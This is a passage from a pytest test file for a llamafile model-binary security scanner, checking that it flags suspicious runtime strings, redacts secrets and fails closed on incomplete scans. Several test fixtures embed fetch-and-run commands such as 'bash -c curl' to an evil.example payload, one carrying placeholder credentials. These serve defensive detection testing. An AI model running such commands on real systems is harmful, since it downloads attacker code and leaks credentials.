        issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    metadata = aggregate.file_metadata[str(binary)]
    assert high_severity == []
    assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert LLAMAFILE_RUNTIME_PREVIEW_READ_REASON in metadata.get("scan_outcome_reasons", [])
    assert determine_exit_code(aggregate) == 2

    cache_dir = tmp_path / "cache"
    reset_cache_manager()
    try:
        cached_aggregate = scan_model_directory_or_file(
            str(binary),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        cached_metadata = cached_aggregate.file_metadata[str(binary)]
        assert cached_aggregate.success is False
        assert cached_metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
        assert LLAMAFILE_RUNTIME_PREVIEW_READ_REASON in cached_metadata.get("scan_outcome_reasons", [])
        assert determine_exit_code(cached_aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_llamafile_late_preview_failure_retains_observed_runtime_findings(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binary = tmp_path / "malicious-preview.llamafile"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=["bash -c curl http://evil.example/payload.sh"]))

    def raise_os_error(_path: Path, _num_bytes: int) -> bytes:
        raise OSError("simulated suffix preview failure")

    monkeypatch.setattr(LlamafileScanner, "_read_suffix", staticmethod(raise_os_error))

    direct = LlamafileScanner().scan(str(binary))

    assert direct.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert direct.bytes_scanned > 0
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in direct.issues)

    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
    assert determine_exit_code(aggregate) == 1
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in aggregate.issues)


def test_llamafile_middle_window_failure_retains_marker_probe_findings(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binary = tmp_path / "malicious-middle-preview.llamafile"
    binary.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"A" * (2 * 1024 * 1024 + 64)
        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
        + b"B" * (2 * 1024 * 1024 + 64)
    )

    def raise_os_error(_path: Path, _offset: int, _num_bytes: int) -> bytes:
        raise OSError("simulated middle preview reread failure")

    monkeypatch.setattr(LlamafileScanner, "_read_window_around_offset", staticmethod(raise_os_error))

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_llamafile_scanner_flags_suspicious_runtime_strings(tmp_path: Path) -> None:
    binary = tmp_path / "suspicious.llamafile"
    binary.write_bytes(
        _build_llamafile_blob(
            runtime_lines=[
                "bash -c curl http://evil.example/payload.sh",
            ]
        )
    )

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert runtime_issues
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)


def test_llamafile_scanner_redacts_sensitive_runtime_evidence(tmp_path: Path) -> None:
    binary = tmp_path / "sensitive-runtime.llamafile"
    binary.write_bytes(
        _build_llamafile_blob(
            runtime_lines=[
                'bash -c curl -H "Authorization: Bearer sk-runtime-secret1234567890" '
                "https://user:pass123@evil.example/payload?token=tok_runtime",
            ]
        )
    )

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert runtime_issues
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)

    details = repr(runtime_issues[0].details)
    assert "sk-runtime-secret" not in details
    assert "pass123" not in details
    assert "tok_runtime" not in details
    assert "curl" in details
    assert "evil.example" in details
    assert "<redacted>" in details


def test_llamafile_scanner_does_not_skip_mixed_safe_and_suspicious_runtime_string(tmp_path: Path) -> None:
    binary = tmp_path / "mixed.llamafile"
    binary.write_bytes(
        _build_llamafile_blob(
            runtime_lines=[
                "llamafile curl http://evil.example/payload.sh",
            ]
        )
    )

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert runtime_issues
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)


def test_llamafile_scanner_allows_known_safe_runtime_fragments(tmp_path: Path) -> None:
    binary = tmp_path / "safe-fragment.llamafile"
    binary.write_bytes(
        _build_llamafile_blob(
            runtime_lines=[
                "INFO llama server listening on http://127.0.0.1:8080",
            ]
        )
    )

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert runtime_issues == []


def test_llamafile_scanner_flags_mixed_safe_fragment_and_command_tokens(tmp_path: Path) -> None:
    binary = tmp_path / "mixed-fragment.llamafile"
    binary.write_bytes(
        _build_llamafile_blob(
            runtime_lines=[
                "INFO llama server listening on http://127.0.0.1:8080 ; curl http://evil.example/payload.sh",
            ]
        )
    )

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert runtime_issues
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)


@pytest.mark.parametrize(
    "runtime_line",
    [
        "%'18T connect(127.0.0.1:8080)",
        "%'18T connect(localhost)",
        "%'18T socket 127.0.0.1:8080",
        "%'18T socket 0.0.0.0:8080",
    ],
)
def test_llamafile_scanner_allows_local_endpoint_runtime_fragments(tmp_path: Path, runtime_line: str) -> None:
    binary = tmp_path / "local-endpoint-fragment.llamafile"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
    assert runtime_issues == []


@pytest.mark.parametrize(
    "runtime_line",
    [
        "INFO llama server listening on http://evil.example/payload.sh",
        "%'18T connect http://evil.example/payload.sh",
        "%'18T socket http://evil.example/payload.sh",
        "%'18T connect(evil.example:8080)",
        "%'18T socket evil.example:8080",
        "%'18T connect(10.0.0.8:8080)",
        "%'18T socket 192.168.1.10:8080",
        "%'18T connect(172.16.0.5:8080)",
    ],
)
def test_llamafile_scanner_flags_safe_fragments_with_remote_network_targets(tmp_path: Path, runtime_line: str) -> None:
    binary = tmp_path / "remote-network-fragment.llamafile"
    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))

    result = LlamafileScanner().scan(str(binary))

    runtime_issues = [
        issue for issue in result.issues if "Executable runtime contains network indicators" in issue.message
    ]
    assert runtime_issues
    assert all(issue.severity == IssueSeverity.INFO for issue in runtime_issues)


def test_llamafile_scanner_handles_truncated_binary(tmp_path: Path) -> None:
    binary = tmp_path / "truncated.llamafile"
    binary.write_bytes(_build_llamafile_blob(embedded_payload=b""))

    result = LlamafileScanner().scan(str(binary))

    assert result.success
    assert any("No embedded GGUF payload marker found" in issue.message for issue in result.issues)


def test_llamafile_scanner_fails_closed_when_payload_scan_window_ends_before_gguf(tmp_path: Path) -> None:
    binary = tmp_path / "late-payload.llamafile"
    late_payload = b"\x00" * 1024 + b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
    binary.write_bytes(_build_llamafile_blob(embedded_payload=late_payload))

    result = LlamafileScanner(config={"llamafile_payload_scan_bytes": 256}).scan(str(binary))

    assert result.success is False
    assert result.metadata.get("analysis_incomplete") is True
    assert LLAMAFILE_PAYLOAD_SCAN_LIMIT_REASON in result.metadata.get("scan_outcome_reasons", [])
    payload_checks = [check for check in result.checks if check.name == "Llamafile Embedded Payload Detection"]
    assert payload_checks
    assert payload_checks[0].message == "No embedded GGUF payload marker found before bounded scan window ended"
    assert payload_checks[0].details.get("analysis_incomplete") is True

    aggregate = scan_model_directory_or_file(
        str(binary),
        llamafile_payload_scan_bytes=256,
        cache_scan_results=False,
    )
    metadata = aggregate.file_metadata[str(binary)]
    assert aggregate.success is False
    assert metadata.get("scan_outcome") == "inconclusive"
    assert LLAMAFILE_PAYLOAD_SCAN_LIMIT_REASON in metadata.get("scan_outcome_reasons", [])
    assert determine_exit_code(aggregate) == 2

    cache_dir = tmp_path / "cache"
    reset_cache_manager()
    try:
        cached_aggregate = scan_model_directory_or_file(
            str(binary),
            llamafile_payload_scan_bytes=256,
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        cached_metadata = cached_aggregate.file_metadata[str(binary)]

        assert cached_aggregate.success is False
        assert cached_metadata.get("scan_outcome") == "inconclusive"
        assert LLAMAFILE_PAYLOAD_SCAN_LIMIT_REASON in cached_metadata.get("scan_outcome_reasons", [])
        assert determine_exit_code(cached_aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_llamafile_embedded_gguf_findings_include_location_mapping(tmp_path: Path) -> None:
    binary = tmp_path / "embedded.llamafile"
    binary.write_bytes(_build_llamafile_blob())

    result = LlamafileScanner().scan(str(binary))

    embedded_checks = [check for check in result.checks if check.name.startswith("Llamafile Embedded")]
    assert embedded_checks
    assert any((check.location or "").startswith("llamafile:") for check in embedded_checks)
